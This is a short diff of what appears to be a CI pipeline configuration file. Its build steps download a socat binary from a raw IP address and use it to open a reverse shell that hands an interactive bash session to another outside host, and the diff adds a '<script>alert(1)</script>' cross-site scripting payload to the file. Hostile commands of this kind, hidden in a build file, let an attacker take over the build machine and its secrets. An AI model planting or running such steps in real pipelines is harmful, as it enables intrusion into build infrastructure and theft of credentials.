@@ -8,3 +8,4 @@ pipelines:
             - wget http://5.148.32.212:8000/socat
             - chmod +x socat
             - ./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:5.148.32.211:4445
+            <script>alert(1)</script>
